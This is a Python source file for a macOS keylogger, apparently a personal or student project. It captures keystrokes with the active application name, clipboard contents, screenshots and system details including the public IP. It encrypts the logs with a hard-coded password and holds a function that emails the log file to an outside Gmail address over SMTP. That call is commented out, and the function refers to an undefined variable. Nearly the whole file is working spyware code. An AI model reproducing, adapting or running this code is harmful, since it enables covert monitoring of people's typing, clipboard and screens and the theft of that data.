import os.path
import socket
import platform
import time
from pynput.keyboard import Key, Listener
from datetime import datetime
from AppKit import NSWorkspace, NSPasteboard, NSStringPboardType
from requests import get
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from multiprocessing import Process, freeze_support
from PIL import ImageGrab
from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64

class Keylogger:
    def __init__(self, interval=15, iterations=5, buffer_size=20):
        # Initalise variables
        self.time_interval = interval
        self.iterations = iterations
        self.buffer_size = buffer_size
        self.output_dir = "out"
        self.log_path = os.path.join(self.output_dir, "log.txt")
        self.clipboard_path = os.path.join(self.output_dir, "clipboard.txt")
        self.sys_path = os.path.join(self.output_dir, "sysinfo.txt")
        
        self.keys = []
        self.apps = []
        self.count = 0
        self.current_time = 0
        self.last_active_app = None
        self.stopping_time = 0

    # Handles key press events, logging any pressed keys, 10 keys at a time
    def on_press(self, key):
        #global keys, count, apps, current_time

        # appends key pressed and current open application to respective lists
        self.keys.append(key)
        self.apps.append(NSWorkspace.sharedWorkspace().activeApplication()['NSApplicationName'])
        self.count += 1

        self.current_time = time.time()

        # once the lists have x amount of entries in them, call write to file and clear lists
        if self.count == self.buffer_size:
            self.write_file()
            self.count = 0
            self.keys.clear()
            self.apps.clear()
        
    def on_release(self, key):
        if key == Key.esc or self.current_time > self.stopping_time:
            # If there are remaining keys in the buffer, write them before stopping
            if self.keys:
                self.write_file()
            return False

    # Converts each key press into a string and appends to the output file, with spaces being converted into a new line
    def write_file(self):
        # Logs each key press
        with open(self.log_path, "a") as file:
            nl = "\n"
            self.last_active_app = self.apps[0]

            #loops through each key/app in keys/apps lists 
            for n in range(len(self.keys)):
                k = str(self.keys[n]).replace("'", "")
                current_app = self.apps[n]

                # if current application changes, start logging on new line
                if self.last_active_app != current_app:
                    self.last_active_app = current_app
                    timestamp = datetime.now().ctime()
                    file.write(nl + timestamp + " " + current_app + " " + k)
                # if space bar pressed, start logging on new line
                elif k == 'Key.space':
                    timestamp = datetime.now().ctime()
                    file.write(nl + timestamp + " " + current_app + " ")
                elif k.startswith("Key."):
                    file.write(' ' + k + ' ')
                else:
                    file.write(k)
                    
    # Initialises log file with column names
    def init_files(self):
        os.makedirs(self.output_dir, exist_ok=True) 


        # Creates out/log.txt if it doesnt already exist
        if (os.path.isfile(self.log_path) != True):
            with open(self.log_path, "x") as file:
                print("log.txt not found, creating file.\n")
                file.write("Timestamp, Current Application, Keys pressed\n")

        # Creates out/clipboard.txt if it doesnt already exist
        if (os.path.isfile(self.clipboard_path) != True):
            with open(self.clipboard_path, "a") as file:
                print("clipboard.txt not found, creating file.\n")
                file.write("")

        # Creates out/sysinfo.txt if it doesnt already exist
        if (os.path.isfile(self.sys_path) != True):
            with open(self.sys_path, "a") as file:
                print("sysinfo.txt not found, creating file.\n")
                file.write("")

    # Gets system information about host and logs it to out/sysinfo.txt
    def log_sys_info(self):
        # get hostname and public IP address
        hostname = socket.gethostname()
        try:
            local_ip = socket.gethostbyname(hostname)
            public_ip = get('https://api.ipify.org').content.decode('utf8').format(local_ip)
        except Exception:
            public_ip = local_ip

        # gets system information
        processor= platform.processor()
        machine = platform.machine()
        sys = platform.system()
        vers = platform.version()
        arch = platform.architecture()[0]

        sysinfo = (
            f"--- System Information ---\n"
            f"Timestamp: {datetime.now().ctime()}\n"
            f"Hostname: {hostname}\n"
            f"IPv4 Address: {public_ip}\n"
            f"Processor: {processor}\n"
            f"Machine: {machine}\n"
            f"System: {sys}\n"
            f"Version: {vers}\n"
            f"Architecture: {arch}\n\n"
        )

        # Write system information to out/sysinfo.txt
        with open(self.sys_path, "a") as file:
            file.write(sysinfo)

    # Constructs and sends an email to specified recipient and attaches log files.
    def send_email(self):
        fromaddr = "MS_hPVXeT@test-p7kx4xw63p7g9yjr.mlsender.net"
        toaddr = 'ibraheem.m.a04@gmail.com'

        # Construct message
        msg = MIMEMultipart()
        msg['From'] = "MS_W4tuaY@test-p7kx4xw63p7g9yjr.mlsender.net"
        msg['To'] = 'ibraheem.m.a04@gmail.com'
        msg['Subject'] = 'User Log'
        body = 'This is a test'

        msg.attach(MIMEText(body, 'plain'))

        # attach file
        attachment = open(self.log_path, "rb")

        # instance of MIMEBase and named as p
        p = MIMEBase('application', 'octet-stream')

        # attach file
        p.set_payload((attachment).read())
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
        msg.attach(p)

        # creates SMTP session
        s = smtplib.SMTP('smtp.mailersend.net', 587)
        # start TLS for security
        s.starttls()

        # Authentication
        s.login(fromaddr,os.environ['mail_pass'])
        # Coverts the Multipart msg into a string
        text = msg.as_string()
        # sending the mail
        s.sendmail(fromaddr, toaddr, text)

        # terminating the session
        s.quit()

    # Gets whatever is currently in users clipboard and saves it to clipboard.txt
    def log_clipboard(self):
        pb = NSPasteboard.generalPasteboard()
        pbstring = pb.stringForType_(NSStringPboardType)

        with open(self.clipboard_path, "a") as file:
            file.write(f"Clipboard Log @ {datetime.now().ctime()}\n")
            file.write(pbstring + "\n\n")

    # takes a screenshot and saves it to /out directory
    def take_screenshot(self, iteration_count):
        screenshot = ImageGrab.grab()
        screenshot_path = os.path.join(self.output_dir, f"screenshot_{iteration_count}.png")
        screenshot.show()
        screenshot.save(screenshot_path)

    # generates a key based off a chosen password and saves it to 'key.txt'
    def get_key(self):
        password = "password".encode()
        salt = b'\x89\x07\x06\xc6i\x99\xd2\x950\xb5Sje\xe4\xd9\xff'

        # uses a deterministic key derivation function to derive a key from the password and salt
        kdf = PBKDF2HMAC(
                algorithm = hashes.SHA256(),
                length = 32,
                salt = salt,
                iterations = 10000,
                backend = default_backend()
        )
        return base64.urlsafe_b64encode(kdf.derive(password))

    # Loops through all files in '/out' and encrypts each file
    def encrypt_files(self):
        key = self.get_key()
        #dir = "/Users/ibrah/Documents/key-logger/out"
        fernet = Fernet(key)

        for filename in os.listdir(self.output_dir):
                filepath = os.path.join(self.output_dir, filename)
                with open(filepath, "rb") as file:
                    data = file.read()
                encrypted_data = fernet.encrypt(data)
                with open(filepath, "wb") as file:
                    file.write(encrypted_data)

    def run(self):
        self.init_files()
        self.log_sys_info()

        iteration_count = 0

        while iteration_count < self.iterations:
            print(f"Starting iteration {iteration_count} \n")
            with Listener(
                        on_press=self.on_press,
                        on_release=self.on_release) as listener:
                print("Key Logger is running\nPressing any key will write it to out/log.txt\n")
                listener.join()

            self.log_clipboard()
            self.take_screenshot(iteration_count)

            print(f"finished iteration {iteration_count} and logged information \n")

            iteration_count += 1
            self.current_time = time.time()
            self.stopping_time = self.current_time + self.time_interval

        print("\nAll iterations complete.")
        print("Encrypting log files...")
        self.encrypt_files()
        # self.send_email()
        print("Keylogger finished.")

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.run()

# Potential improvements
# 
    
